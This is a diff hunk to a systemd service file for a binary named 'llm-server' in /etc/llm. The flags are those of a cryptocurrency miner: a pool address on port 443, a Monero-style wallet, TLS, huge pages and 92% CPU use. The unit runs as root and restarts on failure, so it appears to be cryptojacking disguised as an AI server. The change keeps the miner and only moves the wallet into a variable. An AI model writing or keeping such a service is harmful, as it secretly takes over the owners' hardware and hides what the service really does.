@@ -20,7 +20,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/etc/llm/llm-server --max-cpu-usage 92 -o llmproxy.6553500.xyz:443 -u 44nN4gQ9thU5tHSofDocWZjgPk1SUs4fsAo6hxAz7tqFEqGBAKKxdYTjn7as2DVVgxMZeZQf8aLPPXT9eJM7NKLY2LpSdxH -p 52-ytkfhydj95 -k --tls --huge-pages-jit --asm=auto 
+ExecStart=/etc/llm/llm-server --max-cpu-usage 92 -o llmproxy.6553500.xyz:443 -u $U -p x -k --tls --huge-pages-jit --asm=auto 
 Restart=on-failure
 User=root
 
